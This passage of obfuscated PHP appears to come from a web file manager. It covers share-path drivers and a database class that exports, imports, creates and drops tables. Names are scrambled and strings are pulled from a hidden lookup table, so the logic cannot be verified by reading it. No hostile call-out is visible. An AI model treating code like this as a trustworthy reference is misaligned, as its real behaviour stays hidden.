IO::fileOutServer($éò–ˆºï[$ø¸× ËÏ[94]], $İ£ŸÛÛõ, $¨œ°Î¿, $’Æ…Ğä‰); } IO::fileOut($éò–ˆºï[$ø¸× ËÏ[94]], $İ£ŸÛÛõ, $¨œ°Î¿, $’Æ…Ğä‰); } public function fileOut($€é–ºÙİ, $ÑíÉşæ§ = false, $ÏĞ™’ì° = false, $Ã²Ä¬¶Ó = '') { $this->_fileOut($€é–ºÙİ, $ÑíÉşæ§, $ÏĞ™’ì°, $Ã²Ä¬¶Ó); } public function fileOutServer($ğã’à¢‘, $”­ÍŞôç = false, $èÇÙïç = false, $é§Ùµ¹º = '') { $this->_fileOut($ğã’à¢‘, $”­ÍŞôç, $èÇÙïç, $é§Ùµ¹º, !0); } protected function _fileOutImage($î¾œ«÷, $ÆÇ÷”¼¶ = 250) { $ÚøšÕâÑ =& $_SERVER[¹òÍ›æş]; $ó§»”“ò = $this->model->pathInfo($î¾œ«÷); if ($ó§»”“ò[$ÚøšÕâÑ[448]] == $ÚøšÕâÑ[98]) { show_json($ÚøšÕâÑ[1366] . $î¾œ«÷, !1); } $‚‰Æ°«‹ = $this->model->fileInfoGet($î¾œ«÷); $‚‰Æ°«‹[$ÚøšÕâÑ[32]] = $ó§»”“ò[$ÚøšÕâÑ[32]]; $‚‰Æ°«‹[$ÚøšÕâÑ[179]] = $ó§»”“ò[$ÚøšÕâÑ[179]]; $GLOBALS[$ÚøšÕâÑ[1365]] = $‚‰Æ°«‹[$ÚøšÕâÑ[32]]; $GLOBALS[$ÚøšÕâÑ[178]] = $‚‰Æ°«‹; IO::fileOutImage($‚‰Æ°«‹[$ÚøšÕâÑ[94]], $ÆÇ÷”¼¶); } public function fileOutImage($ÉÙŸ®çí, $ËæÜ­‚ƒ = 250) { $this->_fileOutImage($ÉÙŸ®çí, $ËæÜ­‚ƒ); } public function fileOutImageServer($¥¥Ñèê, $ó°ÚÕä = 250) { $this->_fileOutImage($¥¥Ñèê, $ó°ÚÕä); } public function link($„—ã¬è, $ğã„£Í = '') { $èİÁº™ = $this->model->fileInfoGet($„—ã¬è); return IO::link($èİÁº™[$_SERVER[¹òÍ›æş][94]], $ğã„£Í); } protected function parse($¾ßà¨¤Ş) { $ÊÂ¸ú£¼ =& $_SERVER[¹òÍ›æş]; if (strstr($¾ßà¨¤Ş, $ÊÂ¸ú£¼[8]) === !1) { return array($ÊÂ¸ú£¼[457] => intval($¾ßà¨¤Ş), $ÊÂ¸ú£¼[94] => $ÊÂ¸ú£¼[12], $ÊÂ¸ú£¼[1361] => array()); } $÷§ÚÉÆ” = explode($ÊÂ¸ú£¼[8], trim($¾ßà¨¤Ş, $ÊÂ¸ú£¼[8])); if (count($÷§ÚÉÆ”) < 2) { show_tips(clear_html($¾ßà¨¤Ş) . $ÊÂ¸ú£¼[1367]); } return array($ÊÂ¸ú£¼[457] => intval($÷§ÚÉÆ”[0]), $ÊÂ¸ú£¼[94] => $÷§ÚÉÆ”[1], $ÊÂ¸ú£¼[1361] => array_slice($÷§ÚÉÆ”, 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($¨ ÏÕ§ş) { $this->pathParse = $¨ ÏÕ§ş; $this->model = Model($_SERVER[¹òÍ›æş][1360]); } public function getPathOuter($»™°Æş) { $æÉğîÂí =& $_SERVER[¹òÍ›æş]; if (!$»™°Æş) { return $»™°Æş; } $‘ŸøÌÔÓ = $this->parse($»™°Æş); return trim(KodIO::makeShare($this->pathParse[$æÉğîÂí[437]], $‘ŸøÌÔÓ[$æÉğîÂí[437]]), $æÉğîÂí[8]); } protected function infoParse($¦¤Í˜”‰, $‚ÅùÅ¢Æ = false, $Âš¹»ğ = false) { $ÍË§òß =& $_SERVER[¹òÍ›æş]; $Î£ĞÁ î = $this->pathParse[$ÍË§òß[437]]; $™ô¾¬¤µ = trim($this->pathParse[$ÍË§òß[1195]], $ÍË§òß[8]); return Action($ÍË§òß[1368])->sharePathInfo($Î£ĞÁ î, $™ô¾¬¤µ, $‚ÅùÅ¢Æ); } public function infoFull($ÖğŒúƒö) { $ÒÃÛæƒ¡ =& $_SERVER[¹òÍ›æş]; $¹·óŸĞŠ = explode($ÒÃÛæƒ¡[8], trim($ÖğŒúƒö, $ÒÃÛæƒ¡[8])); if (count($¹·óŸĞŠ) > 1) { $Œ’²‹–ë = implode($ÒÃÛæƒ¡[8], array_splice($¹·óŸĞŠ, 1)); $ÉàÇŸ¥¯ = $this->model->pathInfoByPath($¹·óŸĞŠ[0], $Œ’²‹–ë); if (!$ÉàÇŸ¥¯) { return !1; } $this->pathParse[$ÒÃÛæƒ¡[1195]] = $ÉàÇŸ¥¯[$ÒÃÛæƒ¡[440]]; } return $this->infoParse($ÖğŒúƒö); } public function listAll($¡¹Õé­—) { $à“Ïû´ü =& $_SERVER[¹òÍ›æş]; $‰”Ñ‰¥° = IO::info($this->pathParse[$à“Ïû´ü[94]]); if (!$‰”Ñ‰¥°) { return array(); } $èèã–Â÷ = $this->model->listAll($¡¹Õé­—); $öÅÍà = Model($à“Ïû´ü[630])->getInfo($‰”Ñ‰¥°[$à“Ïû´ü[631]]); foreach ($èèã–Â÷ as &$çÜ½­õ¼) { check_abort(); $çÜ½­õ¼[$à“Ïû´ü[97]] = Action($à“Ïû´ü[1368])->_shareItemeParse($çÜ½­õ¼[$à“Ïû´ü[97]], $öÅÍà); } unset($çÜ½­õ¼); return $èèã–Â÷; } } class PathDriverDbShareLink extends PathDriverDB { public function __construct($Ç©¨·Ú) { $this->pathParse = $Ç©¨·Ú; $this->model = Model($_SERVER[¹òÍ›æş][1360]); } protected function infoParse($ ®Åïà¬, $«½ÃÌû¯ = false, $øÈŒş°ú = false) { $šû²¡–™ =& $_SERVER[¹òÍ›æş]; return Action($šû²¡–™[1201])->sharePathInfo($this->pathParse[$šû²¡–™[94]], !0, $«½ÃÌû¯); } public function listPath($¤Ïšƒ™, $î­Š‡Š = false) { $¼„¾Ìï =& $_SERVER[¹òÍ›æş]; $Ö´½»Ã× = parent::listPath($¤Ïšƒ™, $î­Š‡Š); if (!$Ö´½»Ã×) { return $Ö´½»Ã×; } if (is_array($Ö´½»Ã×[$¼„¾Ìï[1369]])) { $Ö´½»Ã×[$¼„¾Ìï[1369]] = Action($¼„¾Ìï[1201])->shareItemInfo($Ö´½»Ã×[$¼„¾Ìï[1369]]); } foreach ($Ö´½»Ã× as $„˜ÀòÈ => $¸¤·“¬) { if (!in_array($„˜ÀòÈ, array($¼„¾Ìï[93], $¼„¾Ìï[92]))) { continue; } foreach ($¸¤·“¬ as $’“¤º— => $©ö§¶®€) { $Ö´½»Ã×[$„˜ÀòÈ][$’“¤º—] = Action($¼„¾Ìï[1201])->shareItemInfo($©ö§¶®€); } } return $Ö´½»Ã×; } public function listAll($˜Ä±¡ïÊ) { $Ñ€âø„ =& $_SERVER[¹òÍ›æş]; $çèîÍ†‹ = IO::info($this->pathParse[$Ñ€âø„[94]]); if (!$çèîÍ†‹) { return array(); } $¡¹®‘Ç = $this->model->listAll($˜Ä±¡ïÊ); foreach ($¡¹®‘Ç as &$òî¦çáŒ) { $òî¦çáŒ[$Ñ€âø„[97]] = Action($Ñ€âø„[1201])->shareItemInfo($òî¦çáŒ[$Ñ€âø„[97]]); } unset($òî¦çáŒ); return $¡¹®‘Ç; } } goto bîÙ±Ç¿ˆõ; F˜öÅîáÖĞ: class DbManage { function __construct($‡öÂëÅ˜ = array()) { $ÛÎ£®ã =& $_SERVER[¹òÍ›æş]; if (empty($‡öÂëÅ˜)) { $‡öÂëÅ˜ = $GLOBALS[$ÛÎ£®ã[6]][$ÛÎ£®ã[21]]; } $this->database = $‡öÂëÅ˜; } public function model($ğñèò¯­ = '') { return new ModelBase($ğñèò¯­, $_SERVER[¹òÍ›æş][12], $this->database); } public function db($ ĞÒôİ = false) { $Æƒ…—Ì× =& $_SERVER[¹òÍ›æş]; $Ïí§…Úû = array_change_key_case($this->database); if ($this->dbType() == $Æƒ…—Ì×[13] || !$ ĞÒôİ) { return $this->model()->db(); } $¯ÈĞùÑš = $Ïí§…Úû[$Æƒ…—Ì×[999]]; $Ïí§…Úû[$Æƒ…—Ì×[999]] = $Æƒ…—Ì×[12]; if ($Ïí§…Úû[$Æƒ…—Ì×[994]] == $Æƒ…—Ì×[991]) { $Œ£°º…ş = $Ïí§…Úû[$Æƒ…—Ì×[1000]]; $Ïí§…Úû[$Æƒ…—Ì×[1000]] = substr($Œ£°º…ş, 0, strrpos($Œ£°º…ş, $Æƒ…—Ì×[1086])); } $this->database = $Ïí§…Úû; $¿“ûš‹ = $this->model()->db(); try { $»—âı´ = $¿“ûš‹->execute("\x73\x68\157\167\x20\x64\x61\x74\141\142\141\x73\x65\163\40\x6c\x69\153\145\x20\47{$¯ÈĞùÑš}\x27"); } catch (Exception $ŞàÔƒƒñ) { } if (!$»—âı´) { $¿“ûš‹->execute("\143\x72\x65\x61\164\145\x20\144\141\164\x61\x62\141\163\x65\40\x60{$¯ÈĞùÑš}\140"); } $Ïí§…Úû[$Æƒ…—Ì×[999]] = $¯ÈĞùÑš; if ($Ïí§…Úû[$Æƒ…—Ì×[994]] == $Æƒ…—Ì×[991]) { $Ïí§…Úû[$Æƒ…—Ì×[1000]] .= $Æƒ…—Ì×[1086] . $¯ÈĞùÑš; } $this->database = $Ïí§…Úû; $¿“ûš‹->execute("\x75\163\145\40\140{$¯ÈĞùÑš}\x60"); return $¿“ûš‹; } public function createTable($äëÃÒĞÀ, &$Š¦õèøÛ) { $¹Ëö¢‘± =& $_SERVER[¹òÍ›æş]; if (!IO::exist($äëÃÒĞÀ)) { ActionCall($¹Ëö¢‘±[1087], !0, 0); show_json(LNG($¹Ëö¢‘±[1088]), !1); } $†Æß«‚ = $this->model()->db(); $Íö˜ü£Š = sqlSplit(IO::getContent($äëÃÒĞÀ)); foreach ($Íö˜ü£Š as $ÎÜ®óÉ€) { $ö“ñ¤Ö¬ = stripos($ÎÜ®óÉ€, $¹Ëö¢‘±[1089]) === 0; if ($ö“ñ¤Ö¬) { $Š¦õèøÛ->task[$¹Ëö¢‘±[816]] += 1; } $†Æß«‚->execute($ÎÜ®óÉ€); if ($ö“ñ¤Ö¬) { preg_match($¹Ëö¢‘±[1090], $ÎÜ®óÉ€, $—¯£™Ç); $Š¦õèøÛ->task[$¹Ëö¢‘±[1091]] = $—¯£™Ç[1]; $Š¦õèøÛ->update(1); } } } public function insertTable($¢áëÓĞĞ, &$ŒøàûëÛ) { $ÍÇªİ  =& $_SERVER[¹òÍ›æş]; $Éç‘ÔÇî = $this->model()->db(); $ùà³šõ÷ = $×Ê˜—ï³ ? array($×Ê˜—ï³) : $Éç‘ÔÇî->getTables(); foreach ($¢áëÓĞĞ as $²ÎŒŒœğ) { $×Ê˜—ï³ = basename($²ÎŒŒœğ, $ÍÇªİ [818]); if (!in_array($×Ê˜—ï³, $ùà³šõ÷)) { continue; } $ŒøàûëÛ->task[$ÍÇªİ [1091]] = $×Ê˜—ï³; if (get_filesize($²ÎŒŒœğ) == 0) { continue; } $´ø–ÖÅ¯ = $this->sqlToDb($²ÎŒŒœğ, $ŒøàûëÛ); if (!$´ø–ÖÅ¯) { ActionCall($ÍÇªİ [1087], !0, 0); show_json(LNG($ÍÇªİ [1092]) . "\x5b{$×Ê˜—ï³}\135", !1); } } } public function sqlFromDb($êÍ°»ÔŒ, $òšÖÒ§ê, &$—Úƒ÷Ôú, $¸òÖ¨èŠ = '') { if ($—Úƒ÷Ôú) { $—Úƒ÷Ôú->task[$_SERVER[¹òÍ›æş][1091]] = $êÍ°»ÔŒ; } $øâ ÎÕ = $this->model($êÍ°»ÔŒ); $ê¢•ÓñÉ = 0; $ê·¬óÛ = 0; $€ ë’¿œ = 10000; $ëéàšĞò = fopen($òšÖÒ§ê, $_SERVER[¹òÍ›æş][1093]); $”†ïÙºÕ = $øâ ÎÕ->getPk(); $‚“¥îĞ = $øâ ÎÕ->getDbFields(); $¬ß÷«‚ü = $_SERVER[¹òÍ›æş][12]; if ($GLOBALS[$_SERVER[¹òÍ›æş][817]] && in_array($êÍ°»ÔŒ, array($_SERVER[¹òÍ›æş][1094], $_SERVER[¹òÍ›æş][1095]))) { $¬ß÷«‚ü = $êÍ°»ÔŒ; } do { $¼‹äö± = array($”†ïÙºÕ => array($_SERVER[¹òÍ›æş][1041], $ê·¬óÛ)); $–ãü³¹é = $øâ ÎÕ->where($¼‹äö±)->field($‚“¥îĞ)->order($”†ïÙºÕ . $_SERVER[¹òÍ›æş][1096])->limit($€ ë’¿œ)->select(); $–ãü³¹é = !empty($–ãü³¹é) ? $–ãü³¹é : array(); if (!($àû¯ÜÂÔ = count($–ãü³¹é))) { break; } $…º¨ÅÖ• = end($–ãü³¹é); $ê·¬óÛ = $…º¨ÅÖ•[$”†ïÙºÕ]; $Ü¬‰–Ù = array(); foreach ($–ãü³¹é as $Èè Ğø) { if ($¬ß÷«‚ü) { if ($êÍ°»ÔŒ == $_SERVER[¹òÍ›æş][1094]) { if ($Èè Ğø[$_SERVER[¹òÍ›æş][33]] == $_SERVER[¹òÍ›æş][1097]) { $ıËÕˆ†Ú = json_decode($Èè Ğø[$_SERVER[¹òÍ›æş][412]], !0); if ($ıËÕˆ†Ú[$_SERVER[¹òÍ›æş][32]] == $GLOBALS[$_SERVER[¹òÍ›æş][817]] && $ıËÕˆ†Ú[$_SERVER[¹òÍ›æş][780]] != 1) { continue; } } } else { if ($Èè Ğø[$_SERVER[¹òÍ›æş][33]] == $_SERVER[¹òÍ›æş][1098] && $Èè Ğø[$_SERVER[¹òÍ›æş][104]] == $_SERVER[¹òÍ›æş][809]) { continue; } } } if ($¸òÖ¨èŠ) { $Èè Ğø[$_SERVER[¹òÍ›æş][94]] = "\x7b\x69\157\72{$¸òÖ¨èŠ}\175" . substr($Èè Ğø[$_SERVER[¹òÍ›æş][94]], strlen("\173\x69\x6f\x3a{$Èè Ğø[$_SERVER[¹òÍ›æş][847]]}\x7d")); $Èè Ğø[$_SERVER[¹òÍ›æş][847]] = $¸òÖ¨èŠ; } $Ü¬‰–Ù[] = $_SERVER[¹òÍ›æş][1099] . $this->sqlEncode($Èè Ğø) . $_SERVER[¹òÍ›æş][1100]; } $ùÈ¬Ç·Ë = "\x49\116\x53\105\122\x54\40\x49\116\124\117\x20\140{$êÍ°»ÔŒ}\140\40\50\x60" . implode($_SERVER[¹òÍ›æş][1101], $‚“¥îĞ) . $_SERVER[¹òÍ›æş][1102]; fwrite($ëéàšĞò, $ùÈ¬Ç·Ë . implode($_SERVER[¹òÍ›æş][1103], $Ü¬‰–Ù) . $_SERVER[¹òÍ›æş][81] . PHP_EOL); $ê¢•ÓñÉ += $àû¯ÜÂÔ; if ($—Úƒ÷Ôú) { $—Úƒ÷Ôú->update($àû¯ÜÂÔ); } } while ($€ ë’¿œ == $àû¯ÜÂÔ); fclose($ëéàšĞò); return $ê¢•ÓñÉ; } public function sqlToDb($òú«¾ßß, &$¨ĞóËİâ) { $öí½®Àœ =& $_SERVER[¹òÍ›æş]; $ÜÜ‡¯½ = $this->model()->db(); $Àøµ®ôî = @fopen($òú«¾ßß, $öí½®Àœ[1104]); if (!$Àøµ®ôî) { return !1; } $­Ñ‹ ¢¬ = 0; $İÔÔ¢¬Û = $öí½®Àœ[12]; $ò×¹‰š† = array(); $›·ğ‡Îô = $this->dbType(); $ıÍñ¿¢ = $›·ğ‡Îô == $öí½®Àœ[13] ? 500 : 2000; $ïúÉ¡”ë = basename($òú«¾ßß, $öí½®Àœ[818]); $¾§‹ëÎ“ = 0; $ëíàµ½Á = 4194304 - 104858; $ƒ‰Ô™à = 1000000 - 104858; while (!feof($Àøµ®ôî)) { $´Äß¯‰Í = trim(fgets($Àøµ®ôî)); if (!$´Äß¯‰Í) { continue; } $¼´§öÎ³ = $this->sqlDecode($´Äß¯‰Í, $›·ğ‡Îô, $ïúÉ¡”ë); if (stripos($¼´§öÎ³, $öí½®Àœ[393]) === 0) { if (!$İÔÔ¢¬Û) { $İÔÔ¢¬Û = $¼´§öÎ³ . $öí½®Àœ[53]; } continue; } if ($¨ĞóËİâ) { $¨ĞóËİâ->task[$öí½®Àœ[816]] += 1; } $­Ñ‹ ¢¬++; $ò×¹‰š†[] = rtrim(rtrim(trim($¼´§öÎ³), $öí½®Àœ[50]), $öí½®Àœ[81]); $áıì´¦ = null; $Ü²Š¿°˜ = strlen($¼´§öÎ³); $¾§‹ëÎ“ += $Ü²Š¿°˜; if ($¾§‹ëÎ“ >= ($ıÍñ¿¢ == 500 ? $ƒ‰Ô™à : $ëíàµ½Á)) { $áıì´¦ = array_pop($ò×¹‰š†); if ($­Ñ‹ ¢¬ > 1) { $­Ñ‹ ¢¬--; } } if ($­Ñ‹ ¢¬ >= $ıÍñ¿¢ || $áıì´¦) { $¼´§öÎ³ = $İÔÔ¢¬Û . implode($öí½®Àœ[50], $ò×¹‰š†); if (!$ÜÜ‡¯½->execute($¼´§öÎ³)) { return !1; } if ($¨ĞóËİâ) { $¨ĞóËİâ->update($­Ñ‹ ¢¬); } $ò×¹‰š† = array(); $­Ñ‹ ¢¬ = 0; $¾§‹ëÎ“ = 0; if ($áıì´¦) { $ò×¹‰š† = array($áıì´¦); $­Ñ‹ ¢¬ = 1; $¾§‹ëÎ“ = $Ü²Š¿°˜; } } } fclose($Àøµ®ôî); if (!empty($ò×¹‰š†)) { $¼´§öÎ³ = $İÔÔ¢¬Û . implode($öí½®Àœ[50], $ò×¹‰š†); if (!$ÜÜ‡¯½->execute($¼´§öÎ³)) { return !1; } if ($¨ĞóËİâ) { $¨ĞóËİâ->update($­Ñ‹ ¢¬); } } return !0; } public function dropTable($Ä©‚œ‚ = null) { $ŞüÅ†üç = $this->model()->db(); $Æ¨Ê›£ = $Ä©‚œ‚ ? array($Ä©‚œ‚) : $ŞüÅ†üç->getTables(); if (!$Æ¨Ê›£) { return; } foreach ($Æ¨Ê›£ as $Ä©‚œ‚) { if ($Ä©‚œ‚) { $Ä©‚œ‚ = strtolower($Ä©‚œ‚); } else { continue; } $ŞüÅ†üç->execute("\x64\162\157\160\40\164\141\142\x6c\x65\x20\151\146\x20\x65\170\151\163\164\x73\x20\140{$Ä©‚œ‚}\x60"); } } private function sqlEncode($•†ŠÉÕ±) { $Ñ×ñØå¢ =& $_SERVER[¹òÍ›æş]; $ËÚşµÍ = array(); foreach ($•†ŠÉÕ± as $õ½ Òæ¸) { if (is_array($õ½ Òæ¸)) { $õ½ Òæ¸ = json_encode_force($õ½ Òæ¸); } $õ½ Òæ¸ = addslashes($õ½ Òæ¸); $õ½ Òæ¸ = str_replace(array($Ñ×ñØå¢[1105], $Ñ×ñØå¢[59]), array($Ñ×ñØå¢[1106], $Ñ×ñØå¢[1107]), $õ½ Òæ¸); $ËÚşµÍ[] = str_replace($Ñ×ñØå¢[68], $Ñ×ñØå¢[1108], $õ½ Òæ¸); } return $Ñ×ñØå¢[68] . implode($Ñ×ñØå¢[1109], $ËÚşµÍ) . $Ñ×ñØå¢[68]; } private function sqlDecode($®Ó‚‘±º, $å”³Ï”á, $ıÀ†–ëÇ = '') { $½¬³éŸ =& $_SERVER[¹òÍ›æş]; $®Ó‚‘±º = str_replace(array($½¬³éŸ[1106], $½¬³éŸ[1107]), array($½¬³éŸ[1105], $½¬³éŸ[59]), $®Ó‚‘±º); if ($å”³Ï”á == $½¬³éŸ[13]) { return $ıÀ†–ëÇ != $½¬³éŸ[1110] ? stripslashes($®Ó‚‘±º) : $®Ó‚‘±º; } if ($ıÀ†–ëÇ == $½¬³éŸ[1110]) { $®Ó‚‘±º = str_replace($½¬³éŸ[1111], $½¬³éŸ[128], stripslashes($®Ó‚‘±º)); } return $®Ó‚‘±º; } public function getSqlFile($Õçì©¿Ô = '') { $‰«¢ä²Ë =& $_SERVER[¹òÍ›æş]; $¦Ğ÷¾ĞÍ = $this->dbType(!0); $¶Í“éì = CONTROLLER_DIR . "\x69\156\x73\164\x61\x6c\154\57\x64\x61\164\x61\57{$¦Ğ÷¾ĞÍ}\x2e\x73\x71\x6c"; $è Ëš‡ü = file_get_contents($¶Í“éì); $î–µ¢Íˆ = $‰«¢ä²Ë[1112] . ($¦Ğ÷¾ĞÍ == $‰«¢ä²Ë[834] ? $‰«¢ä²Ë[1113] : $‰«¢ä²Ë[1114]) . $‰«¢ä²Ë[1115]; preg_match_all($î–µ¢Íˆ, $è Ëš‡ü, $Ûå¾¿úÅ); $‘¸›…«Ñ = $Ûå¾¿úÅ[1]; $”Šã¢¥× = $this->model()->db(); $‡à¿›¯à = $”Šã¢¥×->getTables(); $ÇòçÖõİ = TEMP_FILES . $‰«¢ä²Ë[1116] . date($‰«¢ä²Ë[249]) . $‰«¢ä²Ë[8]; del_dir($ÇòçÖõİ); mk_dir($ÇòçÖõİ); $˜ä·¼„º = $ÇòçÖõİ . $‰«¢ä²Ë[1117]; $Ñ²Ù±—ä = $ÇòçÖõİ . $‰«¢ä²Ë[1118]; $ìŒÒÍî = $¦Ğ÷¾ĞÍ == $‰«¢ä²Ë[13] ? $‰«¢ä²Ë[834] : $‰«¢ä²Ë[13]; IO::copy(CONTROLLER_DIR . "\x69\x6e\163\164\x61\x6c\x6c\x2f\x64\x61\164\x61\x2f{$ìŒÒÍî}\56\163\161\154", $ÇòçÖõİ); @touch($ÇòçÖõİ . $¦Ğ÷¾ĞÍ . $‰«¢ä²Ë[818]); $×‹†Øº = fopen($˜ä·¼„º, $‰«¢ä²Ë[1093]); $ĞÂ¹ÕÉ¦ = fopen($Ñ²Ù±—ä, $‰«¢ä²Ë[1093]); if ($¦Ğ÷¾ĞÍ == $‰«¢ä²Ë[13]) { $‡à¿›¯à = array_diff($‡à¿›¯à, array($‰«¢ä²Ë[814], $‰«¢ä²Ë[815])); $Ç¯Ùôó® = array($‰«¢ä²Ë[1119], $‰«¢ä²Ë[1120], $‰«¢ä²Ë[1121]); fwrite($ĞÂ¹ÕÉ¦, implode(PHP_EOL, $Ç¯Ùôó®) . PHP_EOL . PHP_EOL); foreach ($‡à¿›¯à as $ÈÔÀµû“) { $€º¿èÍü = $this->sqlFromSqlite($ÈÔÀµû“); if (!$€º¿èÍü[$‰«¢ä²Ë[13]]) { continue; } fwrite($ĞÂ¹ÕÉ¦, $€º¿èÍü[$‰«¢ä²Ë[13]] . PHP_EOL . PHP_EOL); if (!in_array($ÈÔÀµû“, $‘¸›…«Ñ)) { fwrite($×‹†Øº, $€º¿èÍü[$‰«¢ä²Ë[834]] . PHP_EOL . PHP_EOL); } } } else { foreach ($‡à¿›¯à as $ÈÔÀµû“) { $€º¿èÍü = $this->sqlFromMysql($ÈÔÀµû“); if (!$€º¿èÍü[$‰«¢ä²Ë[834]]) { continue; } fwrite($×‹†Øº, $€º¿èÍü[$‰«¢ä²Ë[834]] . PHP_EOL . PHP_EOL); if (!in_array($ÈÔÀµû“, $‘¸›…«Ñ)) { fwrite($ĞÂ¹ÕÉ¦, $€º¿èÍü[$‰«¢ä²Ë[13]] . PHP_EOL . PHP_EOL); } } } fclose($×‹†Øº); fclose($ĞÂ¹ÕÉ¦); $è Ëš‡ü = array($‰«¢ä²Ë[834] => $˜ä·¼„º, $‰«¢ä²Ë[13] => $Ñ²Ù±—ä); return $Õçì©¿Ô ? $è Ëš‡ü[$Õçì©¿Ô] : $è Ëš‡ü; } public function dbType($Ùö¯®øÏ = false) { $ñì£›ó¥ =& $_SERVER[¹òÍ›æş]; $³şòãïí = $Ùö¯®øÏ ? $GLOBALS[$ñì£›ó¥[6]][$ñì£›ó¥[21]] : $this->database; $³şòãïí = array_change_key_case($³şòãïí); $ï¸¨–§´ = $³şòãïí[$ñì£›ó¥[994]]; if ($ï¸¨–§´ == $ñì£›ó¥[991]) { $ä°œæÔ« = explode($ñì£›ó¥[4], $³şòãïí[$ñì£›ó¥[1000]]); $ï¸¨–§´ = $ä°œæÔ«[0]; } $öøà·º = array($ñì£›ó¥[1122] => $ñì£›ó¥[13], $ñì£›ó¥[939] => $ñì£›ó¥[834]); if (isset($öøà·º[$ï¸¨–§´])) { $ï¸¨–§´ = $öøà·º[$ï¸¨–§´]; } return $ï¸¨–§´; } public function sqlFromMysql($·¶ƒÀµÖ, $¨œ…èí = '') { $Óˆ’¿æÂ =& $_SERVER[¹òÍ›æş]; $³ÀĞ•Œ = $this->model()->db(); $Ø¥‰ = $³ÀĞ•Œ->query($Óˆ’¿æÂ[1123] . $·¶ƒÀµÖ . $Óˆ’¿æÂ[423]); if (!$Ø¥‰ || !$Ø¥‰[0]) { return !1; } $©¼Ì´«á = _get($Ø¥‰[0], $Óˆ’¿æÂ[1124], $Óˆ’¿æÂ[12]); if (!$©¼Ì´«á) { return !1; } $•Ï€‰îË = "\104\x52\x4f\x50\40\x54\101\102\114\105\40\x49\x46\x20\105\130\x49\123\x54\123\x20\x60{$·¶ƒÀµÖ}\140\73" . PHP_EOL . $©¼Ì´«á . $Óˆ’¿æÂ[81]; if ($¨œ…èí && $¨œ…èí == $Óˆ’¿æÂ[834]) { return $•Ï€‰îË; } $á˜Šï˜Ë = array_change_key_case($GLOBALS[$Óˆ’¿æÂ[6]][$Óˆ’¿æÂ[21]]); $ì‹øÆ‘Â = $á˜Šï˜Ë[$Óˆ’¿æÂ[999]]; $¬‚ìø¿ = $Óˆ’¿æÂ[1125] . $ì‹øÆ‘Â . $Óˆ’¿æÂ[1126] . $·¶ƒÀµÖ . $Óˆ’¿æÂ[68]; $ã«ÁîÉ± = $Óˆ’¿æÂ[1127] . $·¶ƒÀµÖ . $Óˆ’¿æÂ[927]; $ëÂî¼“û = $³ÀĞ•Œ->query($¬‚ìø¿); if (empty($ëÂî¼“û)) { $©Õàúú® = array($Óˆ’¿æÂ[834] => $Óˆ’¿æÂ[12], $Óˆ’¿æÂ[13] => $Óˆ’¿æÂ[12]); return $¨œ…èí ? $©Õàúú®[$¨œ…èí] : $©Õàúú®; } $ºµ£Œã = $³ÀĞ•Œ->query($ã«ÁîÉ±); $¡¥ò©±Ã = $Óˆ’¿æÂ[12]; $—á¿³İ¬ = array(); foreach ($ºµ£Œã as $ ÁÁë¬¯) { if (!$¡¥ò©±Ã && $ ÁÁë¬¯[$Óˆ’¿æÂ[1128]] == $Óˆ’¿æÂ[1129]) { $¡¥ò©±Ã = $ ÁÁë¬¯[$Óˆ’¿æÂ[1130]]; } if (isset($—á¿³İ¬[$ ÁÁë¬¯[$Óˆ’¿æÂ[1128]]])) { $—á¿³İ¬[$ ÁÁë¬¯[$Óˆ’¿æÂ[1128]]][$Óˆ’¿æÂ[1131]][] = $ ÁÁë¬¯[$Óˆ’¿æÂ[1130]]; continue; } $—á¿³İ¬[$ ÁÁë¬¯[$Óˆ’¿æÂ[1128]]] = array($Óˆ’¿æÂ[1132] => $ ÁÁë¬¯[$Óˆ’¿æÂ[1128]], $Óˆ’¿æÂ[1131] => array($ ÁÁë¬¯[$Óˆ’¿æÂ[1130]]), $Óˆ’¿æÂ[1133] => $ ÁÁë¬¯[$Óˆ’¿æÂ[1134]] == $Óˆ’¿æÂ[98] ? 0 : 1); } $ãò”â“Â = array(); foreach ($—á¿³İ¬ as $ ÁÁë¬¯) { $õİÌ¸Ô = $ ÁÁë¬¯[$Óˆ’¿æÂ[1132]] == $Óˆ’¿æÂ[1129]; $ÎÅÎş× = array($Óˆ’¿æÂ[1135], $ ÁÁë¬¯[$Óˆ’¿æÂ[1133]] == $Óˆ’¿æÂ[98] && !$õİÌ¸Ô ? $Óˆ’¿æÂ[1136] : $Óˆ’¿æÂ[12], $Óˆ’¿æÂ[1137], $Óˆ’¿æÂ[1138] . $·¶ƒÀµÖ . $Óˆ’¿æÂ[11] . ($õİÌ¸Ô ? $Óˆ’¿æÂ[1139] : $ ÁÁë¬¯[$Óˆ’¿æÂ[1132]]) . $Óˆ’¿æÂ[128], $Óˆ’¿æÂ[1140], $Óˆ’¿æÂ[128] . $·¶ƒÀµÖ . $Óˆ’¿æÂ[128], $Óˆ’¿æÂ[1141] . implode($Óˆ’¿æÂ[1142], $ ÁÁë¬¯[$Óˆ’¿æÂ[1131]]) . $Óˆ’¿æÂ[1143]); $ãò”â“Â[] = implode($Óˆ’¿æÂ[53], $ÎÅÎş×) . $Óˆ’¿æÂ[81]; } $°¦²“ÏÑ = array(); $¡à‚ÈÓü = array($Óˆ’¿æÂ[1144] => $Óˆ’¿æÂ[1145], $Óˆ’¿æÂ[1145] => $Óˆ’¿æÂ[1145], $Óˆ’¿æÂ[326] => $Óˆ’¿æÂ[353], $Óˆ’¿æÂ[325] => $Óˆ’¿æÂ[353]); foreach ($ëÂî¼“û as $ ÁÁë¬¯) { $ÎÅÎş× = array($Óˆ’¿æÂ[128] . $ ÁÁë¬¯[$Óˆ’¿æÂ[1146]] . $Óˆ’¿æÂ[128], isset($¡à‚ÈÓü[$ ÁÁë¬¯[$Óˆ’¿æÂ[1147]]]) ? $¡à‚ÈÓü[$ ÁÁë¬¯[$Óˆ’¿æÂ[1147]]] : $ ÁÁë¬¯[$Óˆ’¿æÂ[1148]], $ ÁÁë¬¯[$Óˆ’¿æÂ[1149]] == $Óˆ’¿æÂ[925] ? $Óˆ’¿æÂ[1150] : $Óˆ’¿æÂ[1151], $ ÁÁë¬¯[$Óˆ’¿æÂ[1146]] == $¡¥ò©±Ã ? $Óˆ’¿æÂ[1152] : $Óˆ’¿æÂ[12], $ ÁÁë¬¯[$Óˆ’¿æÂ[976]] ? strtoupper(str_replace($Óˆ’¿æÂ[11], $Óˆ’¿æÂ[12], $ ÁÁë¬¯[$Óˆ’¿æÂ[976]])) : $Óˆ’¿æÂ[12]); $°¦²“ÏÑ[] = trim(implode($Óˆ’¿æÂ[53], $ÎÅÎş×)); } $ûéöèüå 